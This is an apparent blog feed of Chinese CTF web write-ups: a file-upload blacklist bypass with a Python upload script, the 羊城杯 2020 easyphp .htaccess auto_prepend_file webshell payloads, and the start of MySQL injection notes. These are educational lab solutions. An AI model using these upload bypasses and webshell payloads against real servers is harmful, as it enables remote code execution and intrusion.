</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">black_list</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="s2">&#34;ph&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">ext</span> <span class="o">=</span> <span class="n">pathinfo</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span> <span class="n">PATHINFO_EXTENSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">foreach</span> <span class="p">(</span><span class="o">$</span><span class="n">black_list</span> <span class="n">as</span> <span class="o">$</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">ext</span><span class="p">,</span> <span class="o">$</span><span class="n">value</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">filename</span> <span class="o">=</span> <span class="n">urldecode</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">content</span> <span class="o">=</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">waf</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"> <span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Please re-upload&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> </span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>代码审计</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function waf($filename){
</span></span><span class="line"><span class="cl"> $black_list = array(&#34;ph&#34;, &#34;htaccess&#34;, &#34;ini&#34;);
</span></span><span class="line"><span class="cl"> $ext = pathinfo($filename, PATHINFO_EXTENSION);
</span></span><span class="line"><span class="cl"> foreach ($black_list as $value) {
</span></span><span class="line"><span class="cl"> if (stristr($ext, $value)){
</span></span><span class="line"><span class="cl"> return false;
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> return true;
</span></span><span class="line"><span class="cl">} </span></span></code></pre></td></tr></table>
</div>
</div><p>黑名单说明不能使用</p>
<ul>
<li>pathinfo 函数用于获取文件路径的信息,包括目录名,文件名,扩展名等</li>
<li>htaccess</li>
<li>user.ini</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">filename</span> <span class="o">=</span> <span class="n">urldecode</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">content</span> <span class="o">=</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">waf</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"> <span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Please re-upload&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>由<code>$_FILES['file']</code> 可以判断是要上传文件,但是页面没有给出上传文件的选项,因此<strong>需要手动上传表单文件</strong></p>
<p><code>$_FILES['file']['name']</code> 就是上传的文件名信息,会先被url解码然后赋值给$filename</p>
<p><code>$_FILES['file']['tmp_name']</code> 是上传的文件的临时存储路径信息,例如 /var/www/html/1.php</p>
<p><code>$content</code> 会读取上传的文件里面的内容 如果$filename满足waf()函数要求,就把$content内容 写入文件$filename</p>
</li>
<li>
<p>绕过对文件名的限制</p>
<p>使用1.php/.在linux中会被识别为在1.php中创建<code>.</code>文件</p>
<p>或者1.php.后面时空字符就绕过了</p>
</li>
<li>
<p>脚本上传文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">url = &#39;http://node5.anna.nssctf.cn:23626/&#39; # 上传文件地址
</span></span><span class="line"><span class="cl">file_content = &#34;&lt;?php system(env); ?&gt;&#34;
</span></span><span class="line"><span class="cl">files = {&#39;file&#39;: (&#39;3.php%2f.&#39;, file_content)}
</span></span><span class="line"><span class="cl">response = requests.post(url=url, files=files)
</span></span><span class="line"><span class="cl">print(response.text)</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>直接访问对应的php文件，则直接可以看到结果</p>
</li>
</ul>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>文件上传</li>
</ul>

item.title: 【羊城杯 2020】easyphp
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="羊城杯-2020easyphp" class="heading-element"><span>[羊城杯 2020]easyphp</span>
 <a href="#%e7%be%8a%e5%9f%8e%e6%9d%af-2020easyphp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">files</span> <span class="o">=</span> <span class="n">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"> <span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">files</span> <span class="n">as</span> <span class="o">$</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">is_file</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">content</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">filename</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">&#34;/[^a-z\.]/&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">filename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">files</span> <span class="o">=</span> <span class="n">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"> <span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">files</span> <span class="n">as</span> <span class="o">$</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">is_file</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Hello, world&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span> </span></span></code></pre></td></tr></table>
</div>
</div><p>在目录下，<strong>只有index.php能够作为php解析执行</strong></p>
<p>可以写一个.htaccess让index.php自动包含执行代码来实现我们的恶意代码执行</p>
<ul>
<li>
<p>代码审计</p>
<p>访问index.php时删除所有除了index.php的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$files = scandir(&#39;./&#39;); 
</span></span><span class="line"><span class="cl"> foreach($files as $file) { 
</span></span><span class="line"><span class="cl"> if(is_file($file)){ 
</span></span><span class="line"><span class="cl"> if ($file !== &#34;index.php&#34;) { 
</span></span><span class="line"><span class="cl"> unlink($file); 
</span></span><span class="line"><span class="cl"> } 
</span></span><span class="line"><span class="cl"> } 
</span></span><span class="line"><span class="cl"> } </span></span></code></pre></td></tr></table>
</div>
</div><p>对上传内容过滤，对文件名进行了过滤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="o">$</span><span class="n">content</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"> <span class="p">}</span> </span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
<li>
<p>思路一</p>
<p>向<code>.htaccess</code>文件通过<code>#</code>写入shell，并且用<code>auto_prepend_file</code>包含<code>.htaccess</code></p>
<p>但是file关键字被ban了，可以用反斜杠绕过</p>
<p>结尾要用<code>\</code>处理content中的<code>\n</code>，防止与后面的Hello word进行拼接时报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=.htaccess&amp;content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system(&#39;cat%20/fla?&#39;)%3B%3F%3E%5C</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>思路二</p>
<blockquote>
<p>这个需要传参两次，相对上面一句话搞定麻烦一丢丢</p>
</blockquote>
<p>利用.htaccess文件特性，不过这次是通过设置php_value来设置preg_macth正则回溯次数</p>
<p>先写入.htaccess，再直接通过php://filter伪协议写入一句话</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename=.htaccess</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo();</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>文件上传</li>
<li>.htaccess利用</li>
</ul>

item.title: 【CISCN 2023 华北】ez_date
item.author: ting10win@gmail.com (Ting)

item.title: SQL注入
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="sql注入" class="heading-element"><span>SQL注入</span>
 <a href="#sql%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705"target="_blank" rel="external nofollow noopener noreferrer">参考博客</a></p>
</blockquote>
<h2 id="mysql常用函数" class="heading-element"><span>Mysql常用函数</span>
 <a href="#mysql%e5%b8%b8%e7%94%a8%e5%87%bd%e6%95%b0" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">version</span><span class="p">():</span><span class="err">查询数据库的版本</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">user</span><span class="p">():</span><span class="err">查询数据库的使用者</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">database</span><span class="p">():</span><span class="err">数据库</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">system_user</span><span class="p">():</span><span class="err">系统用户名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">session_user</span><span class="p">():</span><span class="err">连接数据库的用户名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">current_user</span><span class="p">():</span><span class="err">当前用户名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">load_file</span><span class="p">():</span><span class="err">读取本地文件</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">@@</span><span class="n">datadir</span><span class="p">:</span><span class="err">读取数据库路径</span><span class="w">
